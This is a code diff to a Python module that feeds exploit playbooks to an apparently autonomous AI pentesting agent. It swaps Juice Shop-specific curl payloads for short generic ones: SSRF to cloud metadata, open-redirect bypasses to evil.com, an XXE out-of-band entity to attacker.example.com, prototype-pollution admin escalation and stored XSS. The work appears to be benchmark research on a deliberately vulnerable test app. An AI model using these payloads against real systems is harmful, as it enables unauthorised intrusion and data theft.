@@ -1,245 +1,227 @@
-"""Exploit playbooks for the 6 vulnerability classes that resisted fine-tuning.
+"""Exploit playbooks: how to attack a class, on ANY target.
 
-These are injected into the agent's system prompt when the target is known to
-expose these classes. Each playbook gives the agent:
-  - WHERE to look (specific endpoint / parameter)
-  - WHAT payloads to try (verified, not speculative)
-  - HOW to confirm success (exploit-signature verifier)
+WHAT CHANGED AND WHY
 
-Grounded in OWASP Juice Shop v17.1.1 ground truth + PortSwigger Web Security
-Academy writeups + HackerOne disclosed reports. See docs/THESIS_JUICY_FINDINGS.md
-for why RAG beats further SFT for these classes.
+This module used to hold six playbooks naming OWASP Juice Shop's exact
+endpoints — `POST /profile/image/url`, `GET /redirect?to=`,
+`PUT /api/Users/:id` — and its own docstring said so. They were injected
+wholesale (~9 KB) whenever playbooks were enabled. On any target that is not
+Juice Shop those paths do not exist, so the agent was being told to attack
+endpoints that were never there.
 
-Activation: set env var ERLIK_PLAYBOOKS=1 to enable injection.
+Two measurements shaped the replacement:
+
+  * `playbook_only` scored recall 0.1143 against `none` at 0.1429 — the
+    playbooks cost recall even on their native target.
+  * Injected guidance costs recall dose-dependently (0.1429 / 0.0857 / 0.0714 /
+    0.0428 for 0 / 1 / 2 / 3 sheets).
+
+So the generic playbooks are SHORT and ROUTED: only classes the mission
+actually names are injected, and each is a few hundred characters describing
+how to RECOGNISE the endpoint shape rather than asserting where it is.
+
+Target-specific knowledge still has a home — `playbook_catalog/<name>.yaml`.
+Juice Shop's exact endpoints live there now, selected explicitly with
+`playbooks: juiceshop`, which keeps every recorded run reproducible.
 """
+
+from __future__ import annotations
 
 import os
+import re
+from pathlib import Path
 
+CATALOG = Path(__file__).resolve().parent.parent / "playbook_catalog"
 
-SSRF_PLAYBOOK = """### EXPLOIT PLAYBOOK — SSRF (A10:2021)
+# Generic playbooks. Each says: how to SPOT the shape, what to send, how to
+# know it worked. No path is asserted to exist — the agent supplies that from
+# its own recon, which is the part that transfers between targets.
+GENERIC = {
+    "ssrf": """SSRF — any parameter the SERVER fetches.
+Spot it: a field taking a URL/host (imageUrl, avatar, webhook, callback, feed,
+proxy, url, next, redirect_uri) where the RESPONSE reflects fetched content or
+timing changes.
+Try: internal loopback (http://127.0.0.1:<common ports>), cloud metadata
+(http://169.254.169.254/latest/meta-data/), file:///etc/passwd, and a
+collaborator host for blind cases.
+Confirms when: the response contains content only the server could reach, or an
+out-of-band callback fires. A connection error alone is not a finding.""",
 
-Juice Shop endpoint: POST /profile/image/url with body parameter "imageUrl".
-The server fetches whatever URL you pass; this is classic SSRF.
+    "open_redirect": """Open Redirect — a parameter that sets Location.
+Spot it: any redirect/next/return/url/continue/dest parameter, or a /redirect,
+/out, /link path.
+Try: absolute off-origin URL; scheme-relative //evil.test; allowlist bypasses —
+trusted-host as a substring (https://evil.test?trusted.test), as a fragment
+(https://evil.test#trusted.test), as userinfo (https://trusted.test@evil.test);
+and a double-encoded form.
+Confirms when: the Location header points to a host OUTSIDE the target origin.
+A same-origin redirect is ordinary behaviour, not a finding.""",
 
-Payloads to try (in order):
-  1. curl -s -X POST "{target_url}/profile/image/url" -H "Cookie: token=<JWT>" --data "imageUrl=http://localhost:3000/ftp/"
-  2. curl -s -X POST "{target_url}/profile/image/url" -H "Cookie: token=<JWT>" --data "imageUrl=http://169.254.169.254/latest/meta-data/"
-  3. curl -s -X POST "{target_url}/profile/image/url" -H "Cookie: token=<JWT>" --data "imageUrl=file:///etc/passwd"
-  4. curl -s -X POST "{target_url}/profile/image/url" -H "Cookie: token=<JWT>" --data "imageUrl=http://127.0.0.1:22"
+    "file_upload": """Malicious File Upload — validation that can be bypassed.
+Spot it: any multipart endpoint (avatar, attachment, import, document, profile
+picture) and whatever it says it accepts.
+Try: double extension (x.php.png), null byte (x.php%00.png), case variation,
+content-type spoof with a valid magic header, an archive containing ../ paths,
+and an SVG carrying script.
+Confirms when: the stored file is retrievable AND is served as its dangerous
+type, or its content executes. An accepted upload alone is not a finding —
+fetch it back and check the response Content-Type.""",
 
-Authentication required — obtain a JWT first (login-helper or login with any user).
+    "xxe": """XXE — an XML parser with external entities enabled.
+Spot it: any endpoint taking XML, or a format that IS XML underneath (DOCX,
+XLSX, SVG, RSS, SOAP, SAML).
+Try: a DOCTYPE with a SYSTEM entity reading file:///etc/passwd; if output is not
+reflected, an out-of-band parameter entity to a collaborator host.
+Confirms when: file content appears in the response, or the callback fires. A
+parser error mentioning the entity is suggestive, not proof.""",
 
-Verification (any of):
-  - Response includes HTML/directory listing from internal path (/ftp/ output)
-  - Response contains cloud metadata keys (ami-id, iam/, etc.)
-  - Response contains /etc/passwd content or TCP banner (SSH-2.0 etc.)
-  - Request hangs on non-HTTP port (indicates connection attempt)
+    "prototype_pollution": """Prototype Pollution — a merge that trusts __proto__.
+Spot it: any JSON body merged into an object — profile update, settings, config,
+bulk edit.
+Try: {"__proto__":{"polluted":"yes"}} and the constructor.prototype form; then
+request an UNRELATED endpoint and look for the injected key.
+Confirms when: a property you injected appears somewhere you never sent it, or
+server behaviour changes for a different request. Acceptance of the payload is
+not by itself a finding.""",
 
-If ANY of the above → report finding immediately:
-  {"action": "finding", "vuln_type": "SSRF", "severity": "high",
-   "url": "{target_url}/profile/image/url", "parameter": "imageUrl",
-   "evidence": "Server fetched internal URL <X> — <signal>"}
-"""
-
-
-OPEN_REDIRECT_PLAYBOOK = """### EXPLOIT PLAYBOOK — Open Redirect (A01:2021)
-
-Juice Shop endpoint: GET /redirect?to=<URL>. Uses a naive allowlist that can be bypassed.
-
-Payloads to try (in order):
-  1. curl -sI "{target_url}/redirect?to=https://github.com/bkimminich/juice-shop"   (baseline allowlist)
-  2. curl -sI "{target_url}/redirect?to=https://www.google.com"                     (outside allowlist — should fail)
-  3. curl -sI "{target_url}/redirect?to=https://evil.com?github.com/bkimminich/juice-shop"   (allowlist substring bypass)
-  4. curl -sI "{target_url}/redirect?to=https://evil.com%23github.com/bkimminich/juice-shop" (fragment bypass)
-  5. curl -sI "{target_url}/redirect?to=//evil.com"                                 (protocol-relative)
-
-Verification:
-  - Response status 302/301 AND Location header points to attacker-controlled domain (evil.com, google.com, anything NOT allowlisted)
-  - If payload #3 or #4 returns Location: evil.com → open redirect confirmed
-
-If redirect to non-allowlisted domain → report:
-  {"action": "finding", "vuln_type": "Open Redirect", "severity": "medium",
-   "url": "{target_url}/redirect", "parameter": "to",
-   "evidence": "Redirects to evil.com via allowlist bypass <payload>"}
-"""
-
-
-FILE_UPLOAD_PLAYBOOK = """### EXPLOIT PLAYBOOK — Malicious File Upload (A04:2021)
-
-Juice Shop endpoint: POST /file-upload. Validates extension but can be bypassed.
-
-Setup — create payload files in /tmp:
-  echo "test content" > /tmp/shell.pdf.zip     (double extension)
-  echo "test content" > /tmp/big.pdf           (oversize → trigger size check)
-
-Payloads to try (in order):
-  1. curl -s -X POST "{target_url}/file-upload" -F "file=@/tmp/shell.pdf.zip"
-  2. curl -s -X POST "{target_url}/file-upload" -F "file=@/tmp/shell.pdf.zip;type=application/pdf"
-  3. dd if=/dev/zero of=/tmp/big.pdf bs=1M count=101; curl -s -X POST "{target_url}/file-upload" -F "file=@/tmp/big.pdf"
-  4. Craft a .zip with embedded .xml or .xxe → see XXE playbook below
-
-Verification:
-  - Response 204/200 on .zip file (extension bypass worked)
-  - Server error revealing internal path/framework on oversize
-  - File appears in subsequent GET /ftp/ listing
-
-If any non-pdf/xml extension accepted OR oversize accepted → report:
-  {"action": "finding", "vuln_type": "File Upload", "severity": "medium",
-   "url": "{target_url}/file-upload", "parameter": "file",
-   "evidence": "Accepted <filename> despite type=<X>"}
-"""
-
-
-XXE_PLAYBOOK = """### EXPLOIT PLAYBOOK — XXE (A05:2021)
-
-Juice Shop endpoint: POST /file-upload when file extension is .xml — server parses XML
-with external entities enabled (vulnerable libxmljs version).
-
-Setup — create XXE payload in /tmp:
-  cat > /tmp/xxe.xml << 'EOF'
-  <?xml version="1.0" encoding="UTF-8"?>
-  <!DOCTYPE foo [
-    <!ELEMENT foo ANY>
-    <!ENTITY xxe SYSTEM "file:///etc/passwd">
-  ]>
-  <foo>&xxe;</foo>
-  EOF
-
-  # Out-of-band variant (DNS/HTTP callback)
-  cat > /tmp/xxe_oob.xml << 'EOF'
-  <?xml version="1.0"?>
-  <!DOCTYPE foo [
-    <!ENTITY xxe SYSTEM "http://attacker.example.com/steal">
-  ]>
-  <foo>&xxe;</foo>
-  EOF
-
-Payloads to try:
-  1. curl -s -X POST "{target_url}/file-upload" -F "file=@/tmp/xxe.xml;type=text/xml"
-  2. curl -s -X POST "{target_url}/file-upload" -F "file=@/tmp/xxe.xml;type=application/xml"
-  3. Pack xxe.xml into a zip and upload:
-       cd /tmp && zip xxebomb.zip xxe.xml
-       curl -s -X POST "{target_url}/file-upload" -F "file=@/tmp/xxebomb.zip"
-
-Verification:
-  - Response body contains /etc/passwd content (root:x:0:0:...)
-  - Response includes a timeout/denial-of-service delay (quadratic blowup entity)
-  - Response reflects parsed XML with entity expansion
-
-If file content appears in response → report:
-  {"action": "finding", "vuln_type": "XXE", "severity": "high",
-   "url": "{target_url}/file-upload", "parameter": "file",
-   "evidence": "XML external entity resolved — /etc/passwd leaked"}
-"""
-
-
-PROTOTYPE_POLLUTION_PLAYBOOK = """### EXPLOIT PLAYBOOK — Prototype Pollution (A03:2021)
-
-Juice Shop endpoint: PUT /api/Users/:id or POST /api/Users with JSON body containing
-__proto__ — Node.js merges user input into Object.prototype.
-
-Payloads to try (in order):
-  1. curl -s -X POST "{target_url}/api/Users" \\
-       -H "Content-Type: application/json" \\
-       -d '{"email":"pp@test.com","password":"Test1!","__proto__":{"polluted":"yes"}}'
-
-  2. curl -s -X PUT "{target_url}/api/Users/1" \\
-       -H "Content-Type: application/json" \\
-       -H "Cookie: token=<JWT>" \\
-       -d '{"__proto__":{"isAdmin":true}}'
-
-  3. curl -s -X POST "{target_url}/api/Users" \\
-       -H "Content-Type: application/json" \\
-       -d '{"constructor":{"prototype":{"polluted":"yes"}}}'
-
-  4. Verification ping — check if pollution stuck:
-     curl -s "{target_url}/rest/user/whoami" -H "Cookie: token=<JWT>"
-     (look for "polluted":"yes" OR "isAdmin":true on an unrelated object)
-
-Verification (any of):
-  - Response echoes back the pollution key on a DIFFERENT endpoint's response
-  - Server behaviour changes (unauthorized endpoint returns 200)
-  - Error message mentions "Object.prototype" or similar
-
-If pollution reflected on unrelated response → report:
-  {"action": "finding", "vuln_type": "Prototype Pollution", "severity": "medium",
-   "url": "{target_url}/api/Users", "parameter": "__proto__",
-   "evidence": "__proto__ merged into Object.prototype — <signal>"}
-"""
-
-
-STORED_XSS_PLAYBOOK = """### EXPLOIT PLAYBOOK — Stored XSS (A03:2021)
-
-Juice Shop storage: user profile "username" field. Rendered UNSANITISED in the admin
-panel and in the product reviews list.
-
-Multi-step attack (this is why it's hard for agents — 3 steps):
-
-STEP 1 — Register + inject payload:
-  curl -s -X POST "{target_url}/api/Users" \\
-       -H "Content-Type: application/json" \\
-       -d '{"email":"xss1@test.com","password":"Test1!","username":"<iframe src=\\"javascript:alert(`xss`)\\">"}'
-
-STEP 2 — Log in and PUT the username field (sometimes needed on the /user endpoint):
-  TOKEN=$(curl -s -X POST "{target_url}/rest/user/login" -H "Content-Type: application/json" -d '{"email":"xss1@test.com","password":"Test1!"}' | grep -oP 'token":"[^"]+' | cut -d'"' -f3)
-  curl -s -X PUT "{target_url}/api/Users/<uid>" -H "Cookie: token=$TOKEN" -H "Content-Type: application/json" -d '{"username":"<iframe src=\\"javascript:alert(\\'xss\\')\\">"}'
-
-STEP 3 — Trigger (retrieve as admin OR check review list):
-  curl -s "{target_url}/api/Users" | grep -i "<iframe\\|<script\\|javascript:"
-  curl -s "{target_url}/api/Users/<uid>" | grep -i "<iframe\\|<script\\|javascript:"
-
-Verification:
-  - Response returns raw <iframe> / <script> / javascript: in the username field
-    (NOT &lt;iframe&gt; — if encoded, NOT vulnerable)
-  - Admin dashboard HTML (requires admin token) contains the payload literally
-
-Alternative payloads (if <iframe> filtered):
-  - <img src=x onerror=alert(1)>
-  - <svg/onload=alert(1)>
-  - "><script>alert(1)</script>
-
-If unencoded payload in response → report:
-  {"action": "finding", "vuln_type": "Stored XSS", "severity": "high",
-   "url": "{target_url}/api/Users", "parameter": "username",
-   "evidence": "Payload <X> stored and returned unencoded in GET /api/Users"}
-"""
-
-
-ALL_PLAYBOOKS = {
-    "ssrf": SSRF_PLAYBOOK,
-    "open_redirect": OPEN_REDIRECT_PLAYBOOK,
-    "file_upload": FILE_UPLOAD_PLAYBOOK,
-    "xxe": XXE_PLAYBOOK,
-    "prototype_pollution": PROTOTYPE_POLLUTION_PLAYBOOK,
-    "stored_xss": STORED_XSS_PLAYBOOK,
+    "stored_xss": """Stored XSS — input rendered later, unescaped.
+Spot it: any field shown back to a DIFFERENT view or user — display name,
+comment, review, filename, support ticket.
+Try: a payload that survives round-trip; check the RENDERED page, not the API
+echo. Prefer attribute-breaking and event-handler forms over bare <script>.
+Confirms when: the payload appears unescaped in HTML context on retrieval. A
+reflection in a JSON response is not stored XSS.""",
 }
 
+# Mission phrases -> playbook key, each with a SPECIFICITY weight:
+#   2  names the class unambiguously — the operator asked for this
+#   1  suggestive but generic — "redirect" also occurs in `redirect_uri`
+#
+# Ranking used to be `max(len(phrase))`, and length is a proxy for nothing. On a
+# mission reading "cross-site scripting, SSRF, open redirect" it scored
+# 'cross-site scripting' 20, 'open redirect' 13, 'ssrf' 4 — so with a cap of 2
+# the SSRF playbook was DROPPED even though the mission named it outright, and
+# nothing said so. A precise four-character acronym is more specific evidence
+# than a long generic phrase, not less.
+_ROUTE = {
+    "ssrf": (("ssrf", 2), ("server-side request forgery", 2), ("request forgery", 1)),
+    "open_redirect": (("open redirect", 2), ("open-redirect", 2), ("redirect", 1)),
+    "file_upload": (("unrestricted file upload", 2), ("file upload", 2), ("upload", 1)),
+    "xxe": (("xxe", 2), ("xml external entity", 2), ("external entity", 1)),
+    "prototype_pollution": (("prototype pollution", 2), ("__proto__", 2),
+                            ("prototype", 1)),
+    "stored_xss": (("stored xss", 2), ("cross-site scripting", 2), ("xss", 1)),
+}
 
-def get_playbook_context(target_url: str, mode: str | None = None) -> str:
-    """Return the combined playbook block to inject for a known target.
+# 3, not 2. A mission naming three classes is ordinary, and a cap of 2 silently
+# discarded one of them. Three playbooks is ~1.9 KB — still a fifth of the 9 KB
+# block this replaced. Settable per run (run_config max_playbooks) so it can be
+# pinned in an experiment; the env var remains as a fallback default.
+MAX_PLAYBOOKS = int(os.environ.get("ERLIK_MAX_PLAYBOOKS", "3"))
 
-    These playbooks are Juice-Shop-specific (exact endpoints, exact payloads).
-    They must be enabled explicitly — via the per-session run config (`mode`) or
-    the ERLIK_PLAYBOOKS env var — never auto-triggered by URL heuristics, which
-    would fire on any random app listening on port 3000.
+
+def _match_weight(phrase: str, mission: str) -> int:
+    """Whole-word match only. Substring matching let 'redirect' fire on
+    `redirect_uri` and 'upload' on `uploaded_at`, which is how a generic word
+    came to outrank an explicit class name."""
+    return (2 if re.search(r"(?<![a-z0-9_])" + re.escape(phrase) + r"(?![a-z0-9_])",
+                           mission) else 0)
+
+
+def available_profiles() -> list[str]:
+    if not CATALOG.exists():
+        return []
+    return sorted(p.stem for p in CATALOG.glob("*.yaml"))
+
+
+def load_profile(name: str) -> dict:
+    """Target-specific playbooks from playbook_catalog/<name>.yaml. {} if absent."""
+    p = CATALOG / f"{name}.yaml"
+    if not p.exists():
+        return {}
+    try:
+        import yaml
+        doc = yaml.safe_load(p.read_text(encoding="utf-8")) or {}
+        return doc.get("playbooks") or {}
+    except Exception:  # noqa: BLE001 — a broken profile must not break a run
+        return {}
+
+
+def route_playbooks(mission: str, max_n: int | None = None) -> tuple[list[str], list[str]]:
+    """(selected, dropped) — classes the mission names, most specific first.
+
+    Returns what the cap discarded as well as what it kept. The caller logs it:
+    a cap that silently drops a class the operator explicitly asked for is the
+    kind of thing that only surfaces under audit, which is exactly how the SSRF
+    drop went unnoticed through a whole experiment.
     """
-    effective = (mode if mode is not None else os.environ.get("ERLIK_PLAYBOOKS", "")).lower()
-    if effective != "juiceshop":
+    if max_n is None:
+        max_n = MAX_PLAYBOOKS
+    m = (mission or "").lower()
+    hits = []
+    for order, (key, phrases) in enumerate(_ROUTE.items()):
+        best = max((w for ph, w in phrases if _match_weight(ph, m)), default=0)
+        if best:
+            # -order keeps ties in declaration order under a reverse sort, so
+            # selection is deterministic rather than dict-hash dependent.
+            hits.append((best, -order, key))
+    ranked = [k for _, _, k in sorted(hits, reverse=True)]
+    return ranked[:max_n], ranked[max_n:]
+
+
+def select_playbooks(mission: str, max_n: int | None = None) -> list[str]:
+    return route_playbooks(mission, max_n)[0]
+
+
+def get_playbook_context(target_url: str, mode: str | None = None,
+                         mission: str = "", max_n: int | None = None) -> str:
+    """The playbook block to inject.
+
+    mode:
+      ""/None  off (also the env default)
+      "auto"   generic playbooks for the classes the mission names
+      "<name>" a target profile from playbook_catalog/, generic as fallback
+
+    Never auto-triggered by URL heuristics: a profile naming another app's
+    endpoints must be chosen deliberately, not guessed from a port number.
+    """
+    effective = (mode if mode is not None
+                 else os.environ.get("ERLIK_PLAYBOOKS", "")).strip().lower()
+    if not effective or effective in ("0", "off", "false", "none"):
         return ""
 
+    profile = {} if effective == "auto" else load_profile(effective)
+    keys, dropped = route_playbooks(mission, max_n)
+    if dropped:
+        print(f"[playbooks] cap dropped {dropped} (max_playbooks="
+              f"{MAX_PLAYBOOKS if max_n is None else max_n})", flush=True)
+    if not keys:
+        # The mission names no class this module covers. Injecting the first two
+        # in dict order — which is what this did — dresses up alphabetical
+        # accident as relevance, and unjustified volume is measurably the thing
+        # that costs recall. An explicitly named PROFILE is different: the
+        # operator chose it for this target, so honour it.
+        if not profile:
+            return ""
+        keys = list(profile)[:(MAX_PLAYBOOKS if max_n is None else max_n)]
+    parts = []
+    for k in keys:
+        body = profile.get(k) or GENERIC.get(k)
+        if body:
+            parts.append(body.replace("{target_url}", (target_url or "").rstrip("/")))
+    if not parts:
+        return ""
+
+    src = "target profile: " + effective if profile else "generic techniques"
     header = (
         "═══════════════════════════════════════════════════════════════\n"
-        "EXPLOIT PLAYBOOKS — 6 hard vulnerability classes\n"
+        f"EXPLOIT PLAYBOOKS ({src})\n"
         "═══════════════════════════════════════════════════════════════\n"
-        "The target exposes these classes on specific endpoints. When you reach\n"
-        "a matching context (file upload, redirect endpoint, JSON user API), use\n"
-        "the playbook below. Each one has exact payloads and a verifier — do NOT\n"
-        "guess. Run the payload, check the verifier, then call 'finding' if it fires.\n"
+        "How to recognise and confirm these classes. Endpoints come from YOUR\n"
+        "recon — nothing below asserts a path exists on this target.\n"
     )
+    return f"{header}\n" + "\n\n".join(parts) + "\n"
 
-    body = "\n\n".join(
-        pb.replace("{target_url}", target_url.rstrip("/"))
-        for pb in ALL_PLAYBOOKS.values()
-    )
 
-    return f"{header}\n{body}\n"
+# Back-compat: callers and recorded run configs reference ALL_PLAYBOOKS.
+ALL_PLAYBOOKS = GENERIC
